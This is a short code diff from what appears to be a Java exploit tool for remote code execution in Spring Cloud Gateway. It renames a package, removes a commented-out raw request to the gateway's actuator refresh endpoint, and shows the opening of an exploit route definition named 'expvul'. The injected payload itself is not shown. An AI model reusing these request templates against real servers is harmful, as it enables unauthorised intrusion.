@@ -1,4 +1,4 @@
-package src.main.module;
+package src.main.vul;
 
 import java.io.BufferedReader;
 import java.io.IOException;
@@ -29,19 +29,6 @@ public class SpringGawRCE {
                     "  }],\n" +
                     "  \"uri\": \"http://example.com\"\n" +
                     "}";
-//    public String refreshData =
-//            "POST /actuator/gateway/refresh HTTP/1.1\n" +
-//                    "Host: %s\n" +
-//                    "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:106.0) " +
-//                    "Gecko/20100101 Firefox/106.0\n" +
-//                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9," +
-//                    "image/avif,image/webp,*/*;q=0.8\n" +
-//                    "Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5," +
-//                    "en-US;q=0.3,en;q=0.2\n" +
-//                    "Accept-Encoding: gzip, deflate\n" +
-//                    "Connection: close\n" +
-//                    "Content-Type: application/x-www-form-urlencoded\n" +
-//                    "Content-Length: 0\n";
     public String expData =
             "{\n" +
                     "  \"id\": \"expvul\",\n" +
